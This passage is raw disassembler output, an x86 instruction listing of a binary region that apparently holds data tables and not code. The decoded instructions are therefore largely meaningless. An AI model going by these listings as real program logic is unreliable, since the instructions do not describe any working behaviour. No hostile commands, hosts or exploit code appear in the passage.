  406f4f:	00 59 01             	add    %bl,0x1(%ecx)
  406f52:	2f                   	das
  406f53:	1f                   	pop    %ds
  406f54:	c7 00 a1 02 7b 0f    	movl   $0xf7b02a1,(%eax)
  406f5a:	01 05 79 02 0e 1e    	add    %eax,0x1e0e0279
  406f60:	6b 01 81             	imul   $0xffffff81,(%ecx),%eax
  406f63:	02 e7                	add    %bh,%ah
  406f65:	20 07                	and    %al,(%edi)
  406f67:	05 81 02 80 0e       	add    $0xe800281,%eax
  406f6c:	0d 05 a9 02 c9       	or     $0xc902a905,%eax
  406f71:	0e                   	push   %cs
  406f72:	47                   	inc    %edi
  406f73:	02 b1 02 1e 0f 47    	add    0x470f1e02(%ecx),%dh
  406f79:	02 c1                	add    %cl,%al
  406f7b:	01 70 26             	add    %esi,0x26(%eax)
  406f7e:	16                   	push   %ss
  406f7f:	04 81                	add    $0x81,%al
  406f81:	02 4a 1f             	add    0x1f(%edx),%cl
  406f84:	13 05 81 02 8c 17    	adc    0x178c0281,%eax
  406f8a:	0e                   	push   %cs
  406f8b:	00 89 02 0e 1e 0e    	add    %cl,0xe1e0e02(%ecx)
  406f91:	00 89 02 d6 0e 6b    	add    %cl,0x6b0ed602(%ecx)
  406f97:	01 b1 02 c0 0e 47    	add    %esi,0x470ec002(%ecx)
  406f9d:	02 a1 02 81 19 c7    	add    -0x38e67efe(%ecx),%ah
  406fa3:	00 c1                	add    %al,%cl
  406fa5:	01 64 21 1a          	add    %esp,0x1a(%ecx,%eiz,1)
  406fa9:	05 89 02 26 21       	add    $0x21260289,%eax
  406fae:	6b 01 89             	imul   $0xffffff89,(%ecx),%eax
  406fb1:	02 9d 0e 20 05 89    	add    -0x76fadff2(%ebp),%bl
  406fb7:	02 d9                	add    %cl,%bl
  406fb9:	24 4b                	and    $0x4b,%al
  406fbb:	02 81 02 76 23 27    	add    0x27237602(%ecx),%al
  406fc1:	05 c1 02 56 1d       	add    $0x1d5602c1,%eax
  406fc6:	30 05 c9 02 eb 0f    	xor    %al,0xfeb02c9
  406fcc:	c7 00 91 02 c3 25    	movl   $0x25c30291,(%eax)
  406fd2:	35 05 c1 01 64       	xor    $0x6401c105,%eax
  406fd7:	21 3f                	and    %edi,(%edi)
  406fd9:	05 91 02 00 12       	add    $0x12000291,%eax
  406fde:	46                   	inc    %esi
  406fdf:	05 d9 02 41 21       	add    $0x214102d9,%eax
  406fe4:	84 00                	test   %al,(%eax)
  406fe6:	d9 02                	flds   (%edx)
  406fe8:	25 10 3e 01 e1       	and    $0xe1013e10,%eax
  406fed:	02 0e                	add    (%esi),%cl
  406fef:	1e                   	push   %ds
  406ff0:	4c                   	dec    %esp
  406ff1:	05 d9 02 a9 1f       	add    $0x1fa902d9,%eax
  406ff6:	2a 01                	sub    (%ecx),%al
  406ff8:	a1 02 e3 0e c3       	mov    0xc30ee302,%eax
  406ffd:	00 c1                	add    %al,%cl
  406fff:	01 64 21 01          	add    %esp,0x1(%ecx,%eiz,1)
  407003:	05 99 02 0e 1e       	add    $0x1e0e0299,%eax
  407008:	6b 01 f1             	imul   $0xfffffff1,(%ecx),%eax
  40700b:	02 71 0f             	add    0xf(%ecx),%dh
  40700e:	6b 01 a1             	imul   $0xffffffa1,(%ecx),%eax
  407011:	02 1e                	add    (%esi),%bl
  407013:	15 c3 00 a1 02       	adc    $0x2a100c3,%eax
  407018:	f3 0e                	repz push %cs
  40701a:	c7 00 89 02 92 14    	movl   $0x14920289,(%eax)
  407020:	4b                   	dec    %ebx
  407021:	02 89 02 c4 11 4b    	add    0x4b11c402(%ecx),%cl
  407027:	02 59 01             	add    0x1(%ecx),%bl
  40702a:	95                   	xchg   %eax,%ebp
  40702b:	23 3e                	and    (%esi),%edi
  40702d:	01 59 01             	add    %ebx,0x1(%ecx)
  407030:	3a 26                	cmp    (%esi),%ah
  407032:	c3                   	ret
  407033:	00 a1 02 48 23 c7    	add    %ah,-0x38dcb7fe(%ecx)
  407039:	00 f9                	add    %bh,%cl
  40703b:	02 0e                	add    (%esi),%cl
  40703d:	1e                   	push   %ds
  40703e:	6b 01 f9             	imul   $0xfffffff9,(%ecx),%eax
  407041:	02 45 12             	add    0x12(%ebp),%al
  407044:	23 02                	and    (%edx),%eax
  407046:	01 03                	add    %eax,(%ebx)
  407048:	0e                   	push   %cs
  407049:	1e                   	push   %ds
  40704a:	0e                   	push   %cs
  40704b:	00 01                	add    %al,(%ecx)
  40704d:	03 0f                	add    (%edi),%ecx
  40704f:	0f 47 02             	cmova  (%edx),%eax
  407052:	c1 01 8d             	roll   $0x8d,(%ecx)
  407055:	1d 47 02 c1 01       	sbb    $0x1c10247,%eax
  40705a:	6e                   	outsb  %ds:(%esi),(%dx)
  40705b:	20 42 02             	and    %al,0x2(%edx)
  40705e:	09 03                	or     %eax,(%ebx)
  407060:	0e                   	push   %cs
  407061:	1e                   	push   %ds
  407062:	6b 01 09             	imul   $0x9,(%ecx),%eax
  407065:	03 b4 21 6a 05 11 03 	add    0x311056a(%ecx,%eiz,1),%esi
  40706c:	f6 1d 70 05 19 03    	negb   0x3190570
  407072:	d9 22                	fldenv (%edx)
  407074:	76 05                	jbe    0x40707b
  407076:	21 03                	and    %eax,(%ebx)
  407078:	78 18                	js     0x407092
  40707a:	7c 05                	jl     0x407081
  40707c:	c1 01 34             	roll   $0x34,(%ecx)
  40707f:	22 47 02             	and    0x2(%edi),%al
  407082:	19 03                	sbb    %eax,(%ebx)
  407084:	df 23                	fbld   (%ebx)
  407086:	bf 01 81 02 f9       	mov    $0xf9028101,%edi
  40708b:	0d 86 05 29 03       	or     $0x3290586,%eax
  407090:	4c                   	dec    %esp
  407091:	00 f4                	add    %dh,%ah
  407093:	01 59 01             	add    %ebx,0x1(%ecx)
  407096:	35 23 7b 00 59       	xor    $0x59007b23,%eax
  40709b:	01 2b                	add    %ebp,(%ebx)
  40709d:	0f c3 00             	movnti %eax,(%eax)
  4070a0:	59                   	pop    %ecx
  4070a1:	01 ff                	add    %edi,%edi
  4070a3:	0e                   	push   %cs
  4070a4:	c3                   	ret
  4070a5:	00 59 01             	add    %bl,0x1(%ecx)
  4070a8:	9d                   	popf
  4070a9:	19 93 05 c1 01 64    	sbb    %edx,0x6401c105(%ebx)
  4070af:	21 99 05 49 03 0e    	and    %ebx,0xe034905(%ecx)
  4070b5:	1e                   	push   %ds
  4070b6:	0e                   	push   %cs
  4070b7:	00 61 01             	add    %ah,0x1(%ecx)
  4070ba:	95                   	xchg   %eax,%ebp
  4070bb:	03 cd                	add    %ebp,%ecx
  4070bd:	03 51 03             	add    0x3(%ecx),%edx
  4070c0:	ee                   	out    %al,(%dx)
  4070c1:	14 75                	adc    $0x75,%al
  4070c3:	01 69 00             	add    %ebp,0x0(%ecx)
  4070c6:	0e                   	push   %cs
  4070c7:	1e                   	push   %ds
  4070c8:	0e                   	push   %cs
  4070c9:	00 21                	add    %ah,(%ecx)
  4070cb:	02 2a                	add    (%edx),%ch
  4070cd:	14 70                	adc    $0x70,%al
  4070cf:	01 69 00             	add    %ebp,0x0(%ecx)
  4070d2:	cb                   	lret
  4070d3:	0c aa                	or     $0xaa,%al
  4070d5:	05 c1 01 57 14       	add    $0x145701c1,%eax
  4070da:	b0 05                	mov    $0x5,%al
  4070dc:	c1 01 4e             	roll   $0x4e,(%ecx)
  4070df:	1d 47 02 c1 01       	sbb    $0x1c10247,%eax
  4070e4:	1c 0d                	sbb    $0xd,%al
  4070e6:	bd 05 59 01 81       	mov    $0x81015905,%ebp
  4070eb:	18 1d 00 61 03 2a    	sbb    %bl,0x2a036100
  4070f1:	14 47                	adc    $0x47,%al
  4070f3:	02 69 03             	add    0x3(%ecx),%ch
  4070f6:	0b 15 c3 00 b1 02    	or     0x2b100c3,%edx
  4070fc:	4f                   	dec    %edi
  4070fd:	0f c3 05 59 03 61 0f 	movnti %eax,0xf610359
  407104:	c3                   	ret
  407105:	05 59 03 2a 14       	add    $0x142a0359,%eax
  40710a:	47                   	inc    %edi
  40710b:	02 71 03             	add    0x3(%ecx),%dh
  40710e:	e5 22                	in     $0x22,%eax
  407110:	c9                   	leave
  407111:	05 79 03 0e 1e       	add    $0x1e0e0379,%eax
  407116:	cf                   	iret
  407117:	05 79 03 64 0e       	add    $0xe640379,%eax
  40711c:	d6                   	salc
  40711d:	05 c1 00 d7 0f       	add    $0xfd700c1,%eax
  407122:	0e                   	push   %cs
  407123:	00 19                	add    %bl,(%ecx)
  407125:	00 d7                	add    %dl,%bh
  407127:	0f 0e                	femms
  407129:	00 09                	add    %cl,(%ecx)
  40712b:	03 0e                	add    (%esi),%ecx
  40712d:	1e                   	push   %ds
  40712e:	36 02 0c 00          	add    %ss:(%eax,%eax,1),%cl
  407132:	0e                   	push   %cs
  407133:	1e                   	push   %ds
  407134:	0e                   	push   %cs
  407135:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407138:	60                   	pusha
  407139:	0b f5                	or     %ebp,%esi
  40713b:	05 0c 00 2b 23       	add    $0x232b000c,%eax
  407140:	f4                   	hlt
  407141:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  407144:	92                   	xchg   %eax,%edx
  407145:	25 fb 05 c1 01       	and    $0x1c105fb,%eax
  40714a:	6c                   	insb   (%dx),%es:(%edi)
  40714b:	19 01                	sbb    %eax,(%ecx)
  40714d:	06                   	push   %es
  40714e:	51                   	push   %ecx
  40714f:	00 ac 20 11 06 51 00 	add    %ch,0x510611(%eax,%eiz,1)
  407156:	cd 01                	int    $0x1
  407158:	17                   	pop    %ss
  407159:	06                   	push   %es
  40715a:	59                   	pop    %ecx
  40715b:	00 a0 0b 17 06 89    	add    %ah,-0x76f9e8f5(%eax)
  407161:	03 64 26 1d          	add    0x1d(%esi,%eiz,1),%esp
  407165:	06                   	push   %es
  407166:	69 00 0e 1e 01 03    	imul   $0x3011e0e,(%eax),%eax
  40716c:	61                   	popa
  40716d:	00 0e                	add    %cl,(%esi)
  40716f:	1e                   	push   %ds
  407170:	2d 06 91 03 d7       	sub    $0xd7039106,%eax
  407175:	0f 0e                	femms
  407177:	00 99 03 0e 1e 56    	add    %bl,0x561e0e03(%ecx)
  40717d:	04 a1                	add    $0xa1,%al
  40717f:	03 ab 13 35 06 81    	add    -0x7ef9caed(%ebx),%ebp
  407185:	02 62 0d             	add    0xd(%edx),%ah
  407188:	0a 00                	or     (%eax),%al
  40718a:	91                   	xchg   %eax,%ecx
  40718b:	02 b6 25 35 05 91    	add    -0x6efacadb(%esi),%dh
  407191:	02 00                	add    (%eax),%al
  407193:	12 43 06             	adc    0x6(%ebx),%al
  407196:	89 01                	mov    %eax,(%ecx)
  407198:	b9 0d 47 02 91       	mov    $0x9102470d,%ecx
  40719d:	02 b6 25 54 06 91    	add    -0x6ef9abdb(%esi),%dh
  4071a3:	02 f7                	add    %bh,%dh
  4071a5:	11 7c 05 91          	adc    %edi,-0x6f(%ebp,%eax,1)
  4071a9:	02 eb                	add    %bl,%ch
  4071ab:	11 6b 01             	adc    %ebp,0x1(%ebx)
  4071ae:	91                   	xchg   %eax,%ecx
  4071af:	02 c3                	add    %bl,%al
  4071b1:	25 5e 06 91 02       	and    $0x291065e,%eax
  4071b6:	a8 0d                	test   $0xd,%al
  4071b8:	6b 01 1c             	imul   $0x1c,(%ecx),%eax
  4071bb:	00 60 0b             	add    %ah,0xb(%eax)
  4071be:	f5                   	cmc
  4071bf:	05 b9 03 9e 23       	add    $0x239e03b9,%eax
  4071c4:	7c 06                	jl     0x4071cc
  4071c6:	1c 00                	sbb    $0x0,%al
  4071c8:	f6 1d 92 06 24 00    	negb   0x240692
  4071ce:	d9 22                	fldenv (%edx)
  4071d0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4071d1:	06                   	push   %es
  4071d2:	1c 00                	sbb    $0x0,%al
  4071d4:	30 12                	xor    %dl,(%edx)
  4071d6:	a9 06 24 00 df       	test   $0xdf002406,%eax
  4071db:	23 bf 01 c9 03 5a    	and    0x5a03c901(%edi),%edi
  4071e1:	19 b3 06 c9 03 5b    	sbb    %esi,0x5b03c906(%ebx)
  4071e7:	0b b9 06 d1 03 ae    	or     -0x51fc2efa(%ecx),%edi
  4071ed:	0f c1 06             	xadd   %eax,(%esi)
  4071f0:	e1 03                	loope  0x4071f5
  4071f2:	24 0d                	and    $0xd,%al
  4071f4:	c8 06 d9 03          	enter  $0xd906,$0x3
  4071f8:	39 0e                	cmp    %ecx,(%esi)
  4071fa:	cf                   	iret
  4071fb:	06                   	push   %es
  4071fc:	f1                   	int1
  4071fd:	03 06                	add    (%esi),%eax
  4071ff:	10 d8                	adc    %bl,%al
  407201:	06                   	push   %es
  407202:	01 04 4f             	add    %eax,(%edi,%ecx,2)
  407205:	1c e2                	sbb    $0xe2,%al
  407207:	06                   	push   %es
  407208:	2c 00                	sub    $0x0,%al
  40720a:	06                   	push   %es
  40720b:	10 17                	adc    %dl,(%edi)
  40720d:	07                   	pop    %es
  40720e:	2c 00                	sub    $0x0,%al
  407210:	d3 21                	shll   %cl,(%ecx)
  407212:	23 07                	and    (%edi),%eax
  407214:	34 00                	xor    $0x0,%al
  407216:	c5 0d 3b 07 1c 00    	lds    0x1c073b,%ecx
  40721c:	0e                   	push   %cs
  40721d:	1e                   	push   %ds
  40721e:	0e                   	push   %cs
  40721f:	00 c1                	add    %al,%cl
  407221:	01 a2 26 84 00 21    	add    %esp,0x21008426(%edx)
  407227:	04 0e                	add    $0xe,%al
  407229:	1e                   	push   %ds
  40722a:	6b 01 19             	imul   $0x19,(%ecx),%eax
  40722d:	04 0e                	add    $0xe,%al
  40722f:	1e                   	push   %ds
  407230:	59                   	pop    %ecx
  407231:	07                   	pop    %es
  407232:	29 04 b6             	sub    %eax,(%esi,%esi,4)
  407235:	1f                   	pop    %ds
  407236:	61                   	popa
  407237:	07                   	pop    %es
  407238:	51                   	push   %ecx
  407239:	01 0c 14             	add    %ecx,(%esp,%edx,1)
  40723c:	93                   	xchg   %eax,%ebx
  40723d:	01 49 04             	add    %ecx,0x4(%ecx)
  407240:	0e                   	push   %cs
  407241:	1e                   	push   %ds
  407242:	6b 01 59             	imul   $0x59,(%ecx),%eax
  407245:	02 0e                	add    (%esi),%cl
  407247:	1e                   	push   %ds
  407248:	0e                   	push   %cs
  407249:	00 31                	add    %dh,(%ecx)
  40724b:	04 0e                	add    $0xe,%al
  40724d:	1e                   	push   %ds
  40724e:	0e                   	push   %cs
  40724f:	00 51 04             	add    %dl,0x4(%ecx)
  407252:	9a 12 01 03 51 04 37 	lcall  $0x3704,$0x51030112
  407259:	12 01                	adc    (%ecx),%al
  40725b:	03 51 04             	add    0x4(%ecx),%edx
  40725e:	44                   	inc    %esp
  40725f:	0d 7a 07 51 04       	or     $0x451077a,%eax
  407264:	9f                   	lahf
  407265:	13 81 07 51 04 ae    	adc    -0x51fbaef9(%ecx),%eax
  40726b:	25 2b 02 51 04       	and    $0x451022b,%eax
  407270:	14 08                	adc    $0x8,%al
  407272:	0e                   	push   %cs
  407273:	00 51 04             	add    %dl,0x4(%ecx)
  407276:	33 1e                	xor    (%esi),%ebx
  407278:	88 07                	mov    %al,(%edi)
  40727a:	39 04 0e             	cmp    %eax,(%esi,%ecx,1)
  40727d:	1e                   	push   %ds
  40727e:	8e 07                	mov    (%edi),%es
  407280:	51                   	push   %ecx
  407281:	04 f6                	add    $0xf6,%al
  407283:	07                   	pop    %es
  407284:	31 02                	xor    %eax,(%edx)
  407286:	39 04 51             	cmp    %eax,(%ecx,%edx,2)
  407289:	16                   	push   %ss
  40728a:	0e                   	push   %cs
  40728b:	00 41 04             	add    %al,0x4(%ecx)
  40728e:	0e                   	push   %cs
  40728f:	1e                   	push   %ds
  407290:	2b 02                	sub    (%edx),%eax
  407292:	59                   	pop    %ecx
  407293:	02 92 25 31 02 51    	add    0x51023125(%edx),%dl
  407299:	03 ee                	add    %esi,%ebp
  40729b:	14 9a                	adc    $0x9a,%al
  40729d:	07                   	pop    %es
  40729e:	79 04                	jns    0x4072a4
  4072a0:	0e                   	push   %cs
  4072a1:	1e                   	push   %ds
  4072a2:	6b 01 51             	imul   $0x51,(%ecx),%eax
  4072a5:	04 fd                	add    $0xfd,%al
  4072a7:	07                   	pop    %es
  4072a8:	2b 02                	sub    (%edx),%eax
  4072aa:	51                   	push   %ecx
  4072ab:	04 23                	add    $0x23,%al
  4072ad:	1e                   	push   %ds
  4072ae:	88 07                	mov    %al,(%edi)
  4072b0:	c1 00 2a             	roll   $0x2a,(%eax)
  4072b3:	15 23 02 81 04       	adc    $0x4810223,%eax
  4072b8:	27                   	daa
  4072b9:	26 be 07 91 04 82    	es mov $0x82049107,%esi
  4072bf:	25 d0 07 a1 04       	and    $0x4a107d0,%eax
  4072c4:	0e                   	push   %cs
  4072c5:	1e                   	push   %ds
  4072c6:	0e                   	push   %cs
  4072c7:	00 c1                	add    %al,%cl
  4072c9:	01 70 21             	add    %esi,0x21(%eax)
  4072cc:	f9                   	stc
  4072cd:	07                   	pop    %es
  4072ce:	49                   	dec    %ecx
  4072cf:	02 b6 1f 99 01 49    	add    0x4901991f(%esi),%dh
  4072d5:	02 b6 1f ab 01 a9    	add    -0x56fe54e1(%esi),%dh
  4072db:	00 0e                	add    %cl,(%esi)
  4072dd:	1e                   	push   %ds
  4072de:	0e                   	push   %cs
  4072df:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4072e2:	78 18                	js     0x4072fc
  4072e4:	06                   	push   %es
  4072e5:	08 1c 00             	or     %bl,(%eax,%eax,1)
  4072e8:	2b 23                	sub    (%ebx),%esp
  4072ea:	f4                   	hlt
  4072eb:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  4072ee:	44                   	inc    %esp
  4072ef:	1c 0e                	sbb    $0xe,%al
  4072f1:	00 c1                	add    %al,%cl
  4072f3:	01 41 20             	add    %eax,0x20(%ecx)
  4072f6:	42                   	inc    %edx
  4072f7:	02 c1                	add    %cl,%al
  4072f9:	00 e1                	add    %ah,%cl
  4072fb:	11 28                	adc    %ebp,(%eax)
  4072fd:	08 49 02             	or     %cl,0x2(%ecx)
  407300:	b6 1f                	mov    $0x1f,%dh
  407302:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407303:	01 51 01             	add    %edx,0x1(%ecx)
  407306:	65 00 32             	add    %dh,%gs:(%edx)
  407309:	08 c1                	or     %al,%cl
  40730b:	01 ec                	add    %ebp,%esp
  40730d:	18 47 02             	sbb    %al,0x2(%edi)
  407310:	a9 04 e5 0f 37       	test   $0x370fe504,%eax
  407315:	08 51 01             	or     %dl,0x1(%ecx)
  407318:	65 00 3c 08          	add    %bh,%gs:(%eax,%ecx,1)
  40731c:	51                   	push   %ecx
  40731d:	01 65 00             	add    %esp,0x0(%ebp)
  407320:	41                   	inc    %ecx
  407321:	08 51 01             	or     %dl,0x1(%ecx)
  407324:	65 00 46 08          	add    %al,%gs:0x8(%esi)
  407328:	51                   	push   %ecx
  407329:	01 6e 00             	add    %ebp,0x0(%esi)
  40732c:	4d                   	dec    %ebp
  40732d:	08 41 03             	or     %al,0x3(%ecx)
  407330:	e5 0f                	in     $0xf,%eax
  407332:	52                   	push   %edx
  407333:	08 51 01             	or     %dl,0x1(%ecx)
  407336:	6e                   	outsb  %ds:(%esi),(%dx)
  407337:	00 57 08             	add    %dl,0x8(%edi)
  40733a:	51                   	push   %ecx
  40733b:	01 6e 00             	add    %ebp,0x0(%esi)
  40733e:	5c                   	pop    %esp
  40733f:	08 51 01             	or     %dl,0x1(%ecx)
  407342:	6e                   	outsb  %ds:(%esi),(%dx)
  407343:	00 61 08             	add    %ah,0x8(%ecx)
  407346:	51                   	push   %ecx
  407347:	01 f0                	add    %esi,%eax
  407349:	0d 68 08 b1 04       	or     $0x4b10868,%eax
  40734e:	e5 0f                	in     $0xf,%eax
  407350:	6d                   	insl   (%dx),%es:(%edi)
  407351:	08 49 02             	or     %cl,0x2(%ecx)
  407354:	b6 1f                	mov    $0x1f,%dh
  407356:	7a 08                	jp     0x407360
  407358:	59                   	pop    %ecx
  407359:	03 31                	add    (%ecx),%esi
  40735b:	26 23 02             	and    %es:(%edx),%eax
  40735e:	e1 02                	loope  0x407362
  407360:	0e                   	push   %cs
  407361:	1e                   	push   %ds
  407362:	88 08                	mov    %cl,(%eax)
  407364:	c1 00 d8             	roll   $0xd8,(%eax)
  407367:	11 f4                	adc    %esi,%esp
  407369:	01 89 01 0e 1e 6b    	add    %ecx,0x6b1e0e01(%ecx)
  40736f:	01 49 02             	add    %ecx,0x2(%ecx)
  407372:	76 00                	jbe    0x407374
  407374:	b6 08                	mov    $0x8,%dh
  407376:	49                   	dec    %ecx
  407377:	02 56 0e             	add    0xe(%esi),%dl
  40737a:	bd 08 49 02 f0       	mov    $0xf0024908,%ebp
  40737f:	0d c4 08 49 02       	or     $0x24908c4,%eax
  407384:	43                   	inc    %ebx
  407385:	00 cb                	add    %cl,%bl
  407387:	08 49 02             	or     %cl,0x2(%ecx)
  40738a:	65 00 d2             	gs add %dl,%dl
  40738d:	08 49 02             	or     %cl,0x2(%ecx)
  407390:	7f 00                	jg     0x407392
  407392:	d9 08                	(bad) (%eax)
  407394:	49                   	dec    %ecx
  407395:	02 6e 00             	add    0x0(%esi),%ch
  407398:	e0 08                	loopne 0x4073a2
  40739a:	49                   	dec    %ecx
  40739b:	02 b6 1f 12 09 d1    	add    -0x2ef6ede1(%esi),%dh
  4073a1:	04 0e                	add    $0xe,%al
  4073a3:	1e                   	push   %ds
  4073a4:	28 09                	sub    %cl,(%ecx)
  4073a6:	09 00                	or     %eax,(%eax)
  4073a8:	80 00 0d             	addb   $0xd,(%eax)
  4073ab:	01 09                	add    %ecx,(%ecx)
  4073ad:	00 84 00 12 01 09 00 	add    %al,0x90112(%eax,%eax,1)
  4073b4:	88 00                	mov    %al,(%eax)
  4073b6:	17                   	pop    %ss
  4073b7:	01 08                	add    %ecx,(%eax)
  4073b9:	00 98 00 5c 01 08    	add    %bl,0x8015c00(%eax)
  4073bf:	00 9c 00 61 01 08 00 	add    %bl,0x80161(%eax,%eax,1)
  4073c6:	a0 00 66 01 08       	mov    0x8016600,%al
  4073cb:	00 a4 00 5c 01 08 00 	add    %ah,0x8015c(%eax,%eax,1)
  4073d2:	ec                   	in     (%dx),%al
  4073d3:	00 7f 02             	add    %bh,0x2(%edi)
  4073d6:	08 00                	or     %al,(%eax)
  4073d8:	f0 00 17             	lock add %dl,(%edi)
  4073db:	01 08                	add    %ecx,(%eax)
  4073dd:	00 f4                	add    %dh,%ah
  4073df:	00 12                	add    %dl,(%edx)
  4073e1:	01 08                	add    %ecx,(%eax)
  4073e3:	00 f8                	add    %bh,%al
  4073e5:	00 84 02 08 00 fc 00 	add    %al,0xfc0008(%edx,%eax,1)
  4073ec:	89 02                	mov    %eax,(%edx)
  4073ee:	08 00                	or     %al,(%eax)
  4073f0:	00 01                	add    %al,(%ecx)
  4073f2:	8e 02                	mov    (%edx),%es
  4073f4:	08 00                	or     %al,(%eax)
  4073f6:	04 01                	add    $0x1,%al
  4073f8:	93                   	xchg   %eax,%ebx
  4073f9:	02 08                	add    (%eax),%cl
  4073fb:	00 08                	add    %cl,(%eax)
  4073fd:	01 98 02 08 00 0c    	add    %ebx,0xc000802(%eax)
  407403:	01 9d 02 08 00 10    	add    %ebx,0x10000802(%ebp)
  407409:	01 a2 02 08 00 14    	add    %esp,0x14000802(%edx)
  40740f:	01 a7 02 08 00 18    	add    %esp,0x18000802(%edi)
  407415:	01 ac 02 2e 00 2b 00 	add    %ebp,0x2b002e(%edx,%eax,1)
  40741c:	06                   	push   %es
  40741d:	03 2e                	add    (%esi),%ebp
  40741f:	00 33                	add    %dh,(%ebx)
  407421:	00 0f                	add    %cl,(%edi)
  407423:	03 2e                	add    (%esi),%ebp
  407425:	00 3b                	add    %bh,(%ebx)
  407427:	00 34 03             	add    %dh,(%ebx,%eax,1)
  40742a:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  40742e:	3d 03 2e 00 4b       	cmp    $0x4b002e03,%eax
  407433:	00 3d 03 2e 00 53    	add    %bh,0x53002e03
  407439:	00 3d 03 2e 00 5b    	add    %bh,0x5b002e03
  40743f:	00 3d 03 2e 00 63    	add    %bh,0x63002e03
  407445:	00 3d 03 2e 00 6b    	add    %bh,0x6b002e03
  40744b:	00 3d 03 2e 00 73    	add    %bh,0x73002e03
  407451:	00 3d 03 2e 00 7b    	add    %bh,0x7b002e03
  407457:	00 43 03             	add    %al,0x3(%ebx)
  40745a:	2e 00 83 00 50 03 2e 	add    %al,%cs:0x2e035000(%ebx)
  407461:	00 8b 00 3d 03 c0    	add    %cl,-0x3ffcc300(%ebx)
  407467:	00 93 00 17 01 e0    	add    %dl,-0x1ffee900(%ebx)
  40746d:	00 93 00 17 01 00    	add    %dl,0x11700(%ebx)
  407473:	01 93 00 17 01 20    	add    %edx,0x20011700(%ebx)
  407479:	01 93 00 17 01 40    	add    %edx,0x40011700(%ebx)
  40747f:	01 93 00 17 01 60    	add    %edx,0x60011700(%ebx)
  407485:	01 93 00 17 01 80    	add    %edx,-0x7ffee900(%ebx)
  40748b:	01 93 00 17 01 a0    	add    %edx,-0x5ffee900(%ebx)
  407491:	01 93 00 17 01 c0    	add    %edx,-0x3ffee900(%ebx)
  407497:	01 93 00 17 01 e0    	add    %edx,-0x1ffee900(%ebx)
  40749d:	01 93 00 17 01 00    	add    %edx,0x11700(%ebx)
  4074a3:	02 93 00 17 01 03    	add    0x3011700(%ebx),%dl
  4074a9:	02 93 00 17 01 20    	add    0x20011700(%ebx),%dl
  4074af:	02 93 00 17 01 40    	add    0x40011700(%ebx),%dl
  4074b5:	02 93 00 17 01 60    	add    0x60011700(%ebx),%dl
  4074bb:	02 93 00 17 01 61    	add    0x61011700(%ebx),%dl
  4074c1:	02 93 00 17 01 63    	add    0x63011700(%ebx),%dl
  4074c7:	02 93 00 17 01 80    	add    -0x7ffee900(%ebx),%dl
  4074cd:	02 93 00 17 01 81    	add    -0x7efee900(%ebx),%dl
  4074d3:	02 93 00 17 01 a0    	add    -0x5ffee900(%ebx),%dl
  4074d9:	02 93 00 17 01 a1    	add    -0x5efee900(%ebx),%dl
  4074df:	02 93 00 17 01 c0    	add    -0x3ffee900(%ebx),%dl
  4074e5:	02 93 00 17 01 c1    	add    -0x3efee900(%ebx),%dl
  4074eb:	02 93 00 17 01 e0    	add    -0x1ffee900(%ebx),%dl
  4074f1:	02 93 00 17 01 e1    	add    -0x1efee900(%ebx),%dl
  4074f7:	02 93 00 17 01 e3    	add    -0x1cfee900(%ebx),%dl
  4074fd:	02 9b 00 b6 03 00    	add    0x3b600(%ebx),%bl
  407503:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  407509:	03 93 00 17 01 20    	add    0x20011700(%ebx),%edx
  40750f:	03 93 00 17 01 21    	add    0x21011700(%ebx),%edx
  407515:	03 93 00 17 01 40    	add    0x40011700(%ebx),%edx
  40751b:	03 93 00 17 01 41    	add    0x41011700(%ebx),%edx
  407521:	03 93 00 17 01 61    	add    0x61011700(%ebx),%edx
  407527:	03 93 00 17 01 81    	add    -0x7efee900(%ebx),%edx
  40752d:	03 93 00 17 01 a1    	add    -0x5efee900(%ebx),%edx
  407533:	03 93 00 17 01 a3    	add    -0x5cfee900(%ebx),%edx
  407539:	03 93 00 17 01 01    	add    0x1011700(%ebx),%edx
  40753f:	00 20                	add    %ah,(%eax)
  407541:	00 00                	add    %al,(%eax)
  407543:	00 14 00             	add    %dl,(%eax,%eax,1)
  407546:	01 00                	add    %eax,(%eax)
  407548:	06                   	push   %es
  407549:	00 00                	add    %al,(%eax)
  40754b:	00 1e                	add    %bl,(%esi)
  40754d:	00 c0                	add    %al,%al
  40754f:	03 c9                	add    %ecx,%ecx
  407551:	03 f4                	add    %esp,%esi
  407553:	03 9c 04 c2 04 e6 04 	add    0x4e604c2(%esp,%eax,1),%ebx
  40755a:	54                   	push   %esp
  40755b:	05 59 05 81 05       	add    $0x5810559,%eax
  407560:	8a 05 8f 05 9f 05    	mov    0x59f058f,%al
  407566:	b6 05                	mov    $0x5,%dh
  407568:	dd 05 08 06 27 06    	fldl   0x6270608
  40756e:	3c 06                	cmp    $0x6,%al
  407570:	4c                   	dec    %esp
  407571:	06                   	push   %es
  407572:	66 06                	pushw  %es
  407574:	af                   	scas   %es:(%edi),%eax
  407575:	06                   	push   %es
  407576:	53                   	push   %ebx
  407577:	07                   	pop    %es
  407578:	67 07                	addr16 pop %es
  40757a:	a3 07 cb 07 da       	mov    %eax,0xda07cb07
  40757f:	07                   	pop    %es
  407580:	e8 07 f0 07 ff       	call   0xff48658c
  407585:	07                   	pop    %es
  407586:	0c 08                	or     $0x8,%al
  407588:	11 08                	adc    %ecx,(%eax)
  40758a:	20 08                	and    %cl,(%eax)
  40758c:	2d 08 72 08 80       	sub    $0x80087208,%eax
  407591:	08 96 08 a2 08 a8    	or     %dl,-0x57f75df8(%esi)
  407597:	08 ae 08 e7 08 f1    	or     %ch,-0xef718f8(%esi)
  40759d:	08 f7                	or     %dh,%bh
  40759f:	08 fc                	or     %bh,%ah
  4075a1:	08 02                	or     %al,(%edx)
  4075a3:	09 0b                	or     %ecx,(%ebx)
  4075a5:	09 18                	or     %ebx,(%eax)
  4075a7:	09 31                	or     %esi,(%ecx)
  4075a9:	09 04 00             	or     %eax,(%eax,%eax,1)
  4075ac:	01 00                	add    %eax,(%eax)
  4075ae:	16                   	push   %ss
  4075af:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075b2:	17                   	pop    %ss
  4075b3:	00 0d 00 18 00 0f    	add    %cl,0xf001800
  4075b9:	00 00                	add    %al,(%eax)
  4075bb:	00 cb                	add    %cl,%bl
